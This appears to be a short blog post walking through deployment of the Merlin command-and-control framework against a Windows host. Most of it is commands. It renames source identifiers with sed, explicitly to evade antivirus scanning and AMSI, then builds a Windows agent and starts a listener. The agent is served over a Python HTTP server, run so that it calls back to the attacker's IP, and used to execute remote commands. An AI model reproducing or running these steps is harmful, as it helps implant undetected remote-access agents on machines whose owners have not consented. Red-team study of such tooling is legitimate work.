---
layout: post
youtubeId: 4J-6mUb4ORQ
---
To use Merlin as a Command & Control server, which is written in golang, we should take the following steps:

{% highlight ruby %}
go version	-> version should be 1.13 or higher
apt update && sudo apt install golang-go
git clone https://github.com/Ne0nd0g/merlin && cd merlin


## Now replace ExecuteShell for MiniMice to trick virusscanners and AMSI
## and also hide Ne0nd0g for AMSI, as this is the developer
find . -name '*.go' -type f -print0 | xargs -0 sed -i 's/ExecuteShell/MiniMice/g'
find . -name '*.go' -type f -print0 | xargs -0 sed -i 's/executeShell/miniMice/g'
find . -name '*.go' -type f -print0 | xargs -0 sed -i 's/github.com\/Ne0nd0g\/merlin/github.com\/mini\/heyho/g'
sed -i 's/github.com\/Ne0nd0g\/merlin/github.com\/mini\/heyho/g' go.mod


## Create an output directory and build the Merlin agent
make agent-windows DIR="./output"

## Start the Merlin server listener
go run cmd/merlinserver/main.go -i 0.0.0.0 -p 8443 -psk strongPassphraseWhaterYouWant

## Run a python HTTP Server to copy the Merlin agent to the Windows system
cd /mnt/tools/merlin/output/
python -m SimpleHTTPServer 80

## Run the Merlin agent on the Windows host
merlinAgent-Windows-x64.exe -url https://172.16.216.135:8443 -psk strongPassphraseWhaterYouWant
[+]New authenticated agent checkin for a0c86f61-4f21-4e63-9856-b73d7b8fbf3a

## Now we can interact with the agent:
interact a0c86f61-4f21-4e63-9856-b73d7b8fbf3a

help
ls
info
cmd whoami

{% endhighlight %}

{% include youtubePlayer.html id=page.youtubeId %}
